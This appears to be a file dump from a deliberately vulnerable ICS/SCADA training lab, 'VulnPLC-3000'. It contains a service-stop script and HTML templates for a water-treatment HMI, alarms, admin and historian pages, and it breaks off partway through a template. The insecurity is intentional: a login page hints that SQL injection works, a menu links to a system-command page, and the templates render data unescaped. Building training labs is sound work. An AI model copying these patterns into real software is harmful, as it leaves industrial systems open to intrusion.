echo -e "${BLUE}  Stopping Infrastructure Services${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

stop_service "Historian"
stop_service "NetworkSim"
stop_service "PhysicalProcess"
stop_service "SystemMonitor"
stop_service "HMI-Server"

# Also kill any remaining Python processes that might be from our services
echo ""
echo -e "${YELLOW}Checking for any remaining service processes...${NC}"
pkill -f "modbus_server.*.py" 2>/dev/null
pkill -f "app.py" 2>/dev/null
pkill -f "plc.*_.*\.py" 2>/dev/null
pkill -f "historian.py" 2>/dev/null
pkill -f "network_simulator.py" 2>/dev/null
pkill -f "physical_process.py" 2>/dev/null
pkill -f "system_monitor.py" 2>/dev/null
pkill -f "hmi_server.py" 2>/dev/null

echo ""
echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${GREEN}  All Services Stopped${NC}"
echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""



================================================================================
FILE: templates/admin.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 15px;
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }
        .menu-item {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            cursor: pointer;
            text-decoration: none;
            display: block;
            transition: transform 0.2s;
        }
        .menu-item:hover { transform: translateY(-5px); }
        .menu-item h3 { margin-bottom: 10px; }
        .menu-item p { opacity: 0.9; font-size: 14px; }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ­ VulnPLC-3000 - Admin Panel</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Administration Menu</h2>
            <div class="menu">
                <a href="/admin/users" class="menu-item">
                    <h3>ðŸ‘¥ User Management</h3>
                    <p>View and manage system users</p>
                </a>
                <a href="/admin/logs" class="menu-item">
                    <h3>ðŸ“‹ System Logs</h3>
                    <p>View audit logs and events</p>
                </a>
                <a href="/admin/system" class="menu-item">
                    <h3>ðŸ–¥ï¸ System Control</h3>
                    <p>Execute system commands</p>
                </a>
                <a href="/debug" class="menu-item">
                    <h3>ðŸ› Debug Info</h3>
                    <p>View system debug information</p>
                </a>
            </div>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/alarms.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Alarm Management - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1400px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #e74c3c;
            padding-bottom: 10px;
        }
        .alarm-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-box {
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            color: white;
        }
        .stat-box.high {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
        }
        .stat-box.medium {
            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
        }
        .stat-box.low {
            background: linear-gradient(135deg, #f1c40f 0%, #f39c12 100%);
        }
        .stat-box.total {
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
        }
        .stat-box h3 {
            font-size: 14px;
            margin-bottom: 10px;
            opacity: 0.9;
        }
        .stat-box .count {
            font-size: 48px;
            font-weight: bold;
        }
        .alarm-item {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 5px solid #e74c3c;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s;
        }
        .alarm-item:hover {
            transform: translateX(5px);
            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
        }
        .alarm-item.high {
            border-left-color: #e74c3c;
            background: #ffebee;
        }
        .alarm-item.medium {
            border-left-color: #f39c12;
            background: #fff8e1;
        }
        .alarm-item.low {
            border-left-color: #f1c40f;
            background: #fffde7;
        }
        .alarm-content {
            flex: 1;
        }
        .alarm-content h3 {
            margin-bottom: 8px;
            color: #2c3e50;
        }
        .alarm-content .timestamp {
            font-size: 14px;
            color: #7f8c8d;
        }
        .alarm-severity {
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 14px;
        }
        .alarm-severity.high {
            background: #e74c3c;
            color: white;
        }
        .alarm-severity.medium {
            background: #f39c12;
            color: white;
        }
        .alarm-severity.low {
            background: #f1c40f;
            color: #333;
        }
        .alarm-actions {
            margin-left: 20px;
        }
        .btn {
            padding: 10px 20px;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn:hover {
            background: #2980b9;
        }
        .btn.ack {
            background: #27ae60;
        }
        .btn.ack:hover {
            background: #229954;
        }
        .no-alarms {
            text-align: center;
            padding: 60px 20px;
            color: #95a5a6;
        }
        .no-alarms i {
            font-size: 64px;
            margin-bottom: 20px;
        }
        .alarm-sound {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #e74c3c;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>âš ï¸ Alarm Management System</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/hmi">HMI</a>
            <a href="/scada">SCADA</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Alarm Statistics</h2>
            <div class="alarm-stats">
                <div class="stat-box total">
                    <h3>Total Active</h3>
                    <div class="count" id="count-total">0</div>
                </div>
                <div class="stat-box high">
                    <h3>High Priority</h3>
                    <div class="count" id="count-high">0</div>
                </div>
                <div class="stat-box medium">
                    <h3>Medium Priority</h3>
                    <div class="count" id="count-medium">0</div>
                </div>
                <div class="stat-box low">
                    <h3>Low Priority</h3>
                    <div class="count" id="count-low">0</div>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>Active Alarms</h2>
            <div id="alarms-list">
                <div class="no-alarms">
                    <div style="font-size: 64px;">âœ“</div>
                    <h3>No Active Alarms</h3>
                    <p>All systems operating normally</p>
                </div>
            </div>
        </div>
    </div>

    <div id="alarm-indicator" class="alarm-sound" style="display: none;">
        ðŸ”” ALARM ACTIVE
    </div>

    <script>
        function updateAlarms() {
            fetch('/api/alarms/list')
                .then(r => r.json())
                .then(data => {
                    const alarms = data.alarms;

                    // Update counts
                    document.getElementById('count-total').textContent = alarms.length;
                    document.getElementById('count-high').textContent =
                        alarms.filter(a => a.severity === 'HIGH').length;
                    document.getElementById('count-medium').textContent =
                        alarms.filter(a => a.severity === 'MEDIUM').length;
                    document.getElementById('count-low').textContent =
                        alarms.filter(a => a.severity === 'LOW').length;

                    // Update alarm list
                    const listDiv = document.getElementById('alarms-list');

                    if (alarms.length === 0) {
                        listDiv.innerHTML = `
                            <div class="no-alarms">
                                <div style="font-size: 64px;">âœ“</div>
                                <h3>No Active Alarms</h3>
                                <p>All systems operating normally</p>
                            </div>
                        `;
                        document.getElementById('alarm-indicator').style.display = 'none';
                    } else {
                        listDiv.innerHTML = alarms.map(alarm => `
                            <div class="alarm-item ${alarm.severity.toLowerCase()}">
                                <div class="alarm-content">
                                    <h3>${alarm.message}</h3>
                                    <div class="timestamp">â° ${alarm.timestamp}</div>
                                </div>
                                <span class="alarm-severity ${alarm.severity.toLowerCase()}">${alarm.severity}</span>
                                <div class="alarm-actions">
                                    <button class="btn ack" onclick="acknowledgeAlarm(${alarm.id})">Acknowledge</button>
                                </div>
                            </div>
                        `).join('');

                        // Show alarm indicator if critical alarms exist
                        if (alarms.some(a => a.severity === 'HIGH')) {
                            document.getElementById('alarm-indicator').style.display = 'block';
                        } else {
                            document.getElementById('alarm-indicator').style.display = 'none';
                        }
                    }
                });
        }

        function acknowledgeAlarm(alarmId) {
            fetch('/api/alarms/acknowledge', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({id: alarmId})
            })
            .then(r => r.json())
            .then(data => {
                updateAlarms();
            });
        }

        // Update every 2 seconds
        setInterval(updateAlarms, 2000);
        updateAlarms();
    </script>
</body>
</html>



================================================================================
FILE: templates/dashboard.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar .user {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .navbar .role {
            background: #3498db;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        .navbar a {
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            background: #e74c3c;
            border-radius: 5px;
        }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 15px;
            color: #2c3e50;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-card h3 { font-size: 14px; margin-bottom: 10px; opacity: 0.9; }
        .stat-card .value { font-size: 32px; font-weight: bold; }
        .menu {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        .menu-btn {
            flex: 1;
            min-width: 200px;
            padding: 20px;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            text-decoration: none;
            display: block;
            text-align: center;
        }
        .menu-btn:hover { background: #2980b9; }
        .registers {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }
        .register {
            padding: 15px;
            background: #ecf0f1;
            border-radius: 5px;
            text-align: center;
        }
        .register .addr { font-size: 12px; color: #7f8c8d; }
        .register .val { font-size: 20px; font-weight: bold; color: #2c3e50; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ­ VulnPLC-3000 Control System</h1>
        <div class="user">
            <span>{{ username }}</span>
            <span class="role">{{ role }}</span>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>System Status</h2>
            <div class="grid">
                <div class="stat-card">
                    <h3>PLC Status</h3>
                    <div class="value">RUNNING</div>
                </div>
                <div class="stat-card">
                    <h3>Modbus Port</h3>
                    <div class="value">5502</div>
                </div>
                <div class="stat-card">
                    <h3>Firmware</h3>
                    <div class="value">1.0.0</div>
                </div>
                <div class="stat-card">
                    <h3>Uptime</h3>
                    <div class="value">42d</div>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>ICS/SCADA Operations</h2>
            <div class="menu">
                <a href="/hmi" class="menu-btn" style="background: #e74c3c;">ðŸ–¥ï¸ HMI Interface</a>
                <a href="/scada" class="menu-btn" style="background: #9b59b6;">ðŸ“Š SCADA Dashboard</a>
                <a href="/process" class="menu-btn" style="background: #3498db;">âš™ï¸ Process Control</a>
                <a href="/alarms" class="menu-btn" style="background: #e67e22;">âš ï¸ Alarms</a>
                <a href="/trending" class="menu-btn" style="background: #1abc9c;">ðŸ“ˆ Trending</a>
            </div>
        </div>

        {% if role == 'admin' %}
        <div class="card">
            <h2>Administration</h2>
            <div class="menu">
                <a href="/admin" class="menu-btn">âš™ï¸ Admin Panel</a>
                <a href="/admin/users" class="menu-btn">ðŸ‘¥ Manage Users</a>
                <a href="/admin/logs" class="menu-btn">ðŸ“‹ View All Logs</a>
                <a href="/admin/system" class="menu-btn">ðŸ–¥ï¸ System Control</a>
            </div>
        </div>
        {% endif %}

        {% if role in ['operator', 'admin'] %}
        <div class="card">
            <h2>Operator Tools</h2>
            <div class="menu">
                <a href="/operator/logs" class="menu-btn" style="background: #3498db;">ðŸ“‹ My Logs</a>
                <a href="/operator/report" class="menu-btn" style="background: #9b59b6;">ðŸ“„ Generate Report</a>
                <a href="/operator/search" class="menu-btn" style="background: #1abc9c;">ðŸ” Search Logs</a>
                <a href="/operator/export" class="menu-btn" style="background: #f39c12;">ðŸ’¾ Export Data</a>
                <a href="/operator/config" class="menu-btn" style="background: #e67e22;">âš™ï¸ Settings</a>
                <a href="/operator/token" class="menu-btn" style="background: #34495e;">ðŸ”‘ Token</a>
            </div>
        </div>
        {% endif %}

        <div class="card">
            <h2>PLC Registers (Sample)</h2>
            <div class="registers" id="registers">
                <!-- Will be populated by JavaScript -->
            </div>
        </div>
    </div>

    <script>
        // Load register values
        for (let i = 0; i < 16; i++) {
            fetch(`/api/plc/read/${i}`)
                .then(r => r.json())
                .then(data => {
                    const div = document.createElement('div');
                    div.className = 'register';
                    div.innerHTML = `
                        <div class="addr">R${i}</div>
                        <div class="val">${data.value || 0}</div>
                    `;
                    document.getElementById('registers').appendChild(div);
                });
        }
    </script>
</body>
</html>



================================================================================
FILE: templates/historian_dashboard.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Historian Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #1a1a2e;
            color: #fff;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 { font-size: 24px; }
        .container { padding: 30px; max-width: 1800px; margin: 0 auto; }
        .card {
            background: #16213e;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        .card h2 { color: #667eea; margin-bottom: 15px; }
        button {
            padding: 10px 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: rgba(102, 126, 234, 0.1);
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        .stat-value { font-size: 32px; font-weight: bold; color: #667eea; }
        .stat-label { font-size: 14px; color: #aaa; margin-top: 5px; }
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .data-table th, .data-table td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        .data-table th { background: rgba(102, 126, 234, 0.2); }
        .data-table tr:hover { background: rgba(102, 126, 234, 0.05); }
        #chartContainer { height: 400px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸ“Š Historian Dashboard</h1>
        <div>{{ username }} | <a href="/logout" style="color: white;">Logout</a></div>
    </div>
    <div class="container">
        <div class="card">
            <h2>Time-Series Data Platform</h2>
            <div class="stats-grid" id="statsGrid">
                <div class="stat-card">
                    <div class="stat-value" id="totalRecords">-</div>
                    <div class="stat-label">Total Records</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="plc1Records">-</div>
                    <div class="stat-label">PLC-1 Records</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="plc2Records">-</div>
                    <div class="stat-label">PLC-2 Records</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="plc3Records">-</div>
                    <div class="stat-label">PLC-3 Records</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="plc4Records">-</div>
                    <div class="stat-label">PLC-4 Records</div>
                </div>
            </div>
            <button onclick="refreshData()">Refresh</button>
            <button onclick="showPLC(1)">Show PLC-1</button>
            <button onclick="showPLC(2)">Show PLC-2</button>
            <button onclick="showPLC(3)">Show PLC-3</button>
            <button onclick="showPLC(4)">Show PLC-4</button>
        </div>

        <div class="card">
            <h2>Recent Data Points</h2>
            <table class="data-table" id="dataTable">
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>PLC</th>
                        <th>Tag</th>
                        <th>Value</th>
                        <th>Quality</th>
                    </tr>
                </thead>
                <tbody id="dataTableBody">
                    <tr><td colspan="5">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let currentPLC = 'all';

        function refreshData() {
            loadStats();
            loadRecentData();
        }

        function showPLC(plcId) {
            currentPLC = plcId;
            loadRecentData();
        }

        function loadStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('totalRecords').textContent = data.total || 0;
                    document.getElementById('plc1Records').textContent = data.plc1 || 0;
                    document.getElementById('plc2Records').textContent = data.plc2 || 0;
                    document.getElementById('plc3Records').textContent = data.plc3 || 0;
                    document.getElementById('plc4Records').textContent = data.plc4 || 0;
                });
        }

        function loadRecentData() {
            fetch('/api/query', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    plc_id: currentPLC,
                    tag_name: '%',
                    hours: 1
                })
            })
            .then(r => r.json())
            .then(data => {
                const tbody = document.getElementById('dataTableBody');
                tbody.innerHTML = '';

                if (data.data && data.data.length > 0) {
                    data.data.slice(0, 50).forEach(row => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td>${row.timestamp}</td>
                            <td>PLC-${row.plc_id}</td>
                            <td>${row.tag_name}</td>
                            <td>${row.value.toFixed(2)}</td>
                            <td>${row.quality}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                } else {
                    tbody.innerHTML = '<tr><td colspan="5">No data available</td></tr>';
                }
            });
        }

        // Auto-refresh every 5 seconds
        setInterval(refreshData, 5000);

        // Load initial data
        refreshData();
    </script>
</body>
</html>



================================================================================
FILE: templates/historian_login.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Historian Login</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            width: 350px;
        }
        h1 {
            color: #667eea;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .error {
            background: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #5568d3;
        }
        .info {
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            border-radius: 5px;
            font-size: 12px;
        }
        .vuln-hint {
            color: #667eea;
            font-size: 11px;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>ðŸ“Š Historian Access</h1>
        <div class="subtitle">Time-Series Data Platform</div>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>

        <div class="info">
            <strong>System Information:</strong><br>
            Platform: VulnHistorian v2.0<br>
            Collecting from 4 PLCs<br>
            Port: 8888 (Web) / 8086 (API)
        </div>

        <div class="vuln-hint">
            Hint: SQL injection works here too
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/hmi_dashboard.html
================================================================================
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICS SCADA HMI - Water Treatment Plant</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: #fff;
            overflow-x: hidden;
        }

        .header {
            background: rgba(0, 0, 0, 0.7);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 3px solid #00ff00;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .header h1 {
            font-size: 24px;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }

        .status-bar {
            display: flex;
            gap: 20px;
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 15px;
            border-radius: 5px;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        .status-dot.green { background: #00ff00; }
        .status-dot.red { background: #ff0000; }
        .status-dot.yellow { background: #ffff00; }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .main-container {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            padding: 20px;
            height: calc(100vh - 80px);
        }

        .pid-diagram {
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        .pid-diagram h2 {
            color: #00ff00;
            margin-bottom: 20px;
            text-align: center;
        }

        .process-area {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 30px;
            margin-top: 30px;
        }

        .equipment {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid #0ff;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            position: relative;
        }

        .equipment h3 {
            color: #0ff;
            margin-bottom: 15px;
            font-size: 18px;
        }

        .tank-visual {
            width: 150px;
            height: 200px;
            border: 3px solid #0ff;
            margin: 20px auto;
            position: relative;
            border-radius: 10px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.5);
        }

        .tank-level {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: linear-gradient(0deg, #00f, #0ff);
            transition: height 0.5s ease;
        }

        .tank-label {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 0 10px #000;
            z-index: 10;
        }

        .gauge {
            width: 150px;
            height: 150px;
            margin: 20px auto;
            position: relative;
        }

        .gauge-circle {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 8px solid #333;
            background: radial-gradient(circle, #111, #000);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .gauge-value {
            font-size: 28px;
            font-weight: bold;
            color: #00ff00;
        }

        .gauge-label {
            position: absolute;
            bottom: -25px;
            width: 100%;
            text-align: center;
            color: #0ff;
            font-size: 14px;
        }

        .indicator {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 10px 0;
            justify-content: center;
        }

        .indicator-light {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 2px solid #333;
        }

        .indicator-light.on {
            background: #00ff00;
            box-shadow: 0 0 15px #00ff00;
        }

        .indicator-light.off {
            background: #333;
        }

        .control-panel {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 15px;
        }

        .control-btn {
            padding: 10px;
            border: 2px solid #00ff00;
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }

        .control-btn:hover {
            background: rgba(0, 255, 0, 0.3);
            box-shadow: 0 0 15px #00ff00;
        }

        .control-btn.danger {
            border-color: #ff0000;
            color: #ff0000;
            background: rgba(255, 0, 0, 0.1);
        }

        .control-btn.danger:hover {
            background: rgba(255, 0, 0, 0.3);
            box-shadow: 0 0 15px #ff0000;
        }

        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .alarm-panel {
            background: rgba(0, 0, 0, 0.7);
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
        }

        .alarm-panel h2 {
            color: #ff0000;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .alarm-item {
            background: rgba(255, 0, 0, 0.1);
            border-left: 4px solid #ff0000;
            padding: 10px;
            margin: 10px 0;
            border-radius: 3px;
            animation: flash 2s infinite;
        }

        .alarm-item.critical {
            border-left-color: #ff0000;
            background: rgba(255, 0, 0, 0.2);
        }

        .alarm-item.high {
            border-left-color: #ff6600;
            background: rgba(255, 102, 0, 0.1);
        }

        .alarm-item.medium {
            border-left-color: #ffff00;
            background: rgba(255, 255, 0, 0.1);
        }

        @keyframes flash {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .stats-panel {
            background: rgba(0, 0, 0, 0.7);
            border: 2px solid #0ff;
            border-radius: 10px;
            padding: 15px;
        }

        .stats-panel h2 {
            color: #0ff;
            margin-bottom: 15px;
        }

        .stat-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
        }

        .stat-label {
            color: #aaa;
        }

        .stat-value {
            color: #0ff;
            font-weight: bold;
        }

        .warning-banner {
            position: fixed;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #ff0000;
            color: #fff;
            padding: 15px 30px;
            border-radius: 5px;
            font-weight: bold;
            font-size: 18px;
            z-index: 1000;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
            animation: shake 0.5s infinite;
            display: none;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(-50%) translateY(0); }
            25% { transform: translateX(-50%) translateY(-5px); }
            75% { transform: translateX(-50%) translateY(5px); }
        }

        .warning-banner.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸ­ SCADA HMI - Water Treatment Plant</h1>
        <div class="status-bar">
            <div class="status-item">
                <div class="status-dot green" id="systemStatus"></div>
                <span>System: <span id="systemStatusText">OPERATIONAL</span></span>
            </div>
            <div class="status-item">
                <div class="status-dot green" id="commStatus"></div>
                <span>Comms: ONLINE</span>
            </div>
            <div class="status-item">
                <span id="currentTime"></span>
            </div>
        </div>
    </div>

    <div class="warning-banner" id="emergencyBanner">
        ðŸš¨ EMERGENCY SHUTDOWN ACTIVE ðŸš¨
    </div>

    <div class="main-container">
        <div class="pid-diagram">
            <h2>Process & Instrumentation Diagram (P&ID)</h2>

            <div class="process-area">
                <!-- Tank System -->
                <div class="equipment">
                    <h3>TANK-001: Water Storage</h3>
                    <div class="tank-visual">
                        <div class="tank-level" id="tankLevel"></div>
                        <div class="tank-label" id="tankLevelText">50%</div>
                    </div>

                    <div class="indicator">
                        <div class="indicator-light" id="pumpLight"></div>
                        <span>PUMP-001</span>
                    </div>

                    <div class="indicator">
                        <div class="indicator-light" id="valveLight"></div>
                        <span>VALVE-001 (<span id="valvePosition">50</span>%)</span>
                    </div>

                    <div class="control-panel">
                        <button class="control-btn" onclick="controlAction('tank', 'start_pump')">START PUMP</button>
                        <button class="control-btn danger" onclick="controlAction('tank', 'stop_pump')">STOP PUMP</button>
